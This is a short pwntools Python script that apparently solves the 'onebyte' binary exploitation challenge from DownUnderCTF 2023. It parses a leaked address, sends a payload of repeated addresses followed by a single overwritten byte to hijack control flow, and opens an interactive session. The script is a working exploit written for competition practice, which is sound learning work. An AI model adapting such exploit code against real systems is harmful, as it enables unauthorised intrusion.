from pwn import *

p = process("./onebyte")
gdb.attach(p)

#p = remote("2023.ductf.dev", 30018)

p.recvuntil(b"Free junk: ")
init = int(p.recvline().decode()[:10],16)

log.success(f"{hex(init)=}")

payload = p32(init+70)*4 + b"\x10"

p.recvuntil(b"Your turn:")
p.sendline(payload)

p.interactive()
